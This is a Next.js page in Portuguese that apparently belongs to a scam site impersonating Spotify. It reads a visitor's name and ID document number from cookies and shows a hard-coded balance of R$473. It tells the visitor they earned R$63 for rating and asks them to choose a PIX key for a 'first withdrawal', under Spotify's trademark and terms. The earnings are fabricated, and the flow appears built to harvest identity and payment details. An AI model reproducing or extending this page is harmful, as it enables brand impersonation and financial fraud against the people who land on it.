import Image from "next/image";
import Logo from '@/assets/logo-green.png'
import { cookies } from "next/headers";
import { FormPayment } from "./form-payment";
import { redirect } from "next/navigation";


export default function PaymentPage() {

  const name = cookies().get('user_name')
  const document = cookies().get('user_document')



  if (!name || !document) {
    redirect('/spotify/register')
  }

  return (
    <div className="w-full relative min-h-screen bg-[#181818] text-white">
      <div className="sticky z-50 top-0 left-0 right-0 h-16 bg-black flex items-center justify-between p-5">
        <Image src={Logo} className='object-contain' width={100} height={30} alt='logo' priority />

        <div className='bg-[#01D661] rounded-2xl flex items-center gap-1 p-2'>
          <span className='text-sm font-semibold'>Saldo: </span>
          <span className='text-sm font-semibold'>{new Intl.NumberFormat('pt-BR', {
            style: 'currency',
            currency: 'BRL'
          }).format(473)}</span>
        </div>

      </div>

      <div className='w-full p-5'>
        <div className='w-full bg-black rounded-lg p-5 space-y-8'>

          <h2 className='text-2xl font-bold text-center'>Olá, {name?.value.toUpperCase().split(" ")[0]}!</h2>


          <div className='text-center bg-[#01d661]/40 border border-[#01D661] p-4 rounded-lg text-white/90'>
            Você ganhou <span className='text-sm font-bold text-white'>{new Intl.NumberFormat('pt-BR', {
              style: 'currency',
              currency: 'BRL'
            }).format(63)}
            </span>
            {" "}por avaliar!
          </div>


          <p className="text-sm font-[#a8a8a8] text-center">Realize seu <span className="font-bold text-white">PRIMEIRO SAQUE!</span></p>
          <p className="text-sm font-[#a8a8a8] text-center">Escolha sua chave PIX:</p>


          <FormPayment name={name.value} document={document.value} />

          <p className="text-center text-xs text-[#a8a8a8] pt-10">
            Este site é protegido pelo reCAPTCHA e está sujeito à <b className="text-[#01d661]">Política de Privacidade</b> e aos <b className="text-[#01d661]">Termos de Serviço do Spotify ®.</b>
          </p>

        </div>
      </div>




    </div>
  )
}